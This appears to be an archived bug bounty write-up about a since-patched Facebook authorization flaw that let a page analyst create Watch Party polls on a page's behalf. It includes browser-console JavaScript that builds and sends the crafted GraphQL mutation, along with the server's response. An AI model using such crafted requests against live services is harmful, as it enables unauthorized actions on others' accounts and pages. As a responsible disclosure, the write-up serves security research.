---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-08-24_create-living-room-polls-as-a-facebook-page-analyst.md
original_filename: 2019-08-24_create-living-room-polls-as-a-facebook-page-analyst.md
title: Create living room polls as a Facebook page analyst
category: documents
detected_topics:
- access-control
- command-injection
- otp
- graphql
tags:
- imported
- documents
- access-control
- command-injection
- otp
- graphql
language: en
raw_sha256: 1856b69dd52676f935dba08939230d808bda6a7443d356a668c4b0fb17b4658b
text_sha256: ebe2839fa51bce12a856f6bc1c47c99a53cf3424317490908adaaf84245079e2
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# Create living room polls as a Facebook page analyst

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-08-24_create-living-room-polls-as-a-facebook-page-analyst.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, graphql
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `1856b69dd52676f935dba08939230d808bda6a7443d356a668c4b0fb17b4658b`
- Text SHA256: `ebe2839fa51bce12a856f6bc1c47c99a53cf3424317490908adaaf84245079e2`


## Content

---
title: "Create living room polls as a Facebook page analyst"
page_title: "Create living room polls as a Facebook page analyst - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/create-living-room-polls-as-a-facebook-page-analyst/"
final_url: "https://philippeharewood.com/create-living-room-polls-as-a-facebook-page-analyst/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["Broken authorization"]
bounty: "5,000"
publication_date: "2019-08-24"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5064
---

Posted on [August 24, 2019](https://philippeharewood.com/create-living-room-polls-as-a-facebook-page-analyst/)

# Create living room polls as a Facebook page analyst

It’s possible to add polls to watch parties. An analyst can currently create polls.

1\. Start the watch party in the group, the URL should change to a format similar to the following

`https://www.facebook.com/groups/GROUP_ID/wp/WATCH_PARTY_ID/`

2\. As a page analyst in a separate Google Chrome profile (or browser) enter the following in a console window, replacing fields in `CA_PS`  
  
`doc_id = '2'; fb_api_caller_class = 'RelayModern';variables = "{input:{client_mutation_id:0,actor_id: ACTOR_ID, living_room_id:WATCH_PARTY_ID, question:'where', options:['a','b','c']}}"; av='ACTOR_ID';`

WATCH_PARTY_ID is the party created in step 1  
ACTOR_ID is the page the analyst has a role  
av is needed to make the call on behalf of the page, not the user

So for a page 111 with a watch party ID 333, the above fields look like  
  
`doc_id = '2'; fb_api_caller_class = 'RelayModern';variables = "{input:{client_mutation_id:0,actor_id:111, living_room_id:333, question:'where', options:['a','b','c']}}"; av='111';`

3\. Then send the graphQL request as an AJAX call in the console window  
  
`new AsyncRequest('/api/graphql/').setData({variables:variables,doc_id:doc_id,fb_api_caller_class:fb_api_caller_class,av:av}).send()`

The response will be empty

`{  
"data": {  
"living_room_poll_create": {  
"client_mutation_id": null  
}  
},  
"extensions": {  
"is_final": true,  
"dtsg_token": null  
}  
}`

4\. The poll will be created by the analyst on behalf of the page

**Timeline**

Aug 24, 2019 – Report sent  
Aug 30, 2019 – Confirmation of submission by Facebook  
Sep 26, 2019 – Confirmation of patch by Facebook  
Oct 24, 2019 – $5000 Bounty awarded by Facebook  
  
**Impact**  
  
Anyone can publish a poll on any page’s Watch Party
